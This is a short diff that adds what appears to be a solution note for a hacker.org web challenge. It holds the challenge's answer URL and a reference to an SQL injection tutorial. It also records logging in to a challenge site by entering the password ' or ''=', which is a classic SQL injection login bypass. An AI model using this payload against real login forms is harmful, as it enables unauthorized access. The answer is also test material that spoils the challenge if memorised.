@@ -1,0 +1,8 @@
+Q: http://www.hacker.org/challenge/chal.php?id=180
+A: http://www.hacker.org/challenge/chal.php?answer=dave+rhodes+makes+serious+cheddar&id=180&go=Submit
+
+Reference: http://securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html
+
+Logged in http://www.adum.com/secureroom/ with the below username and password.
+Name: adum
+Password: ' or ''='
